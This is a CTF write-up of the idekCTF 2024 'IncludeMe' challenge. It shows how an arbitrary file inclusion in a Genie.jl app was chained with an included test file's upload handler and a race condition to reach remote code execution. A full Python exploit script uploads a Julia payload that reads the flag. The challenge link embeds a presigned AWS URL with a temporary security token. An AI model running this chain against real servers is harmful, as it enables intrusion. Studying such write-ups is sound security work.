---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466XESU5RBF%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T095959Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDIaCXVzLXdlc3QtMiJHMEUCIQDapARZ3SqLIrbOOKxHY56AgLqFoH9Pw4Ka90juRy1a4wIgShurE11rj4QS4oAPBydAR%2FvJRP%2By2qevJ3irnjH9rlMqiAQI6%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDIG4TbP8GSAU7h%2FKGircA8nfAd9aGdxnFVI2ajDnUaLPx%2FGwLDaFKORw1o7ta%2Bzcx%2BwSQuDeWMPkoyqo9CULEk65nc4XevB1rIVr%2BASFO4A7xYvmj6iGzVT6qs5Jc8ayehWet%2FR8YXZ3nX%2FZ5y%2FajMTFeArcayK29qlsk9cI%2F0P3Co9l9Aum8UF%2FutrleJoBViK89NwGr38ZyLYZ9T%2FWORKEsWPBB4zGGqwqjT44cTeZdTxmXHAKU2U4i7lBxQ4GPWKTnjDXRjzmOm4Fr0nktIcRs33Q2MwZvDNyDirPDp%2Fg%2F63Xg2uKSPtGEYJCwgSiVmxpMKduPeURqzhkxc3UBc3Sgm5SCNgiUellN0YAXoOFMk1fwGMUnW%2F8WTY4fACNJDCqtpl2dZWMfdL39JlVn0A5oX8%2BAP0ukH%2FMzatrUoHZmgYj%2BVBWYMQtRvdE6xMGlyZsGXwksf%2FE2mlSI9vp6GHY%2FRJms7B%2BeRqrxgFDZAY4n%2BHteVgUlCMLioicLY7po465atOMtbcoRWQhUTD3c7%2BfVVVOIFIwMAWX3OrB3GTITwIGu5Z0fstEkp9%2BeoAPQmZ9sJRU2285uuHCMfaSE7F6vGvBRegzM5O9CD1%2BWPfldIdfSFBP%2FAprH%2BLKnhCFLXm%2FyRKLw7Rc5PtHMLiLwcEGOqUBy5OF2QwG2uwTXFgCz242JDBkrVl8fJULjSRoCc6Can3B9Z8aYbUeiuSrqu74Vqz4dnhU08Y0DrgLiQlITvSMko6TDd8kXDOsWA6pJUb5UnOnit%2FXVumF7DFk4DRFDJx1eF9aCDWUIFdp9yR%2BiB2KWlm574mNgdBiyr3oNOpGvgOAzVkhzWvSajKGVGLsj25%2BvN4jfig2d%2BjFbLLHoFyiSdMKWoA%2B\&X-Amz-Signature=e91cfb38989eba0cb1f8426d61121f32c7ea4863072fe583c8f55a1469a5e1c5\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
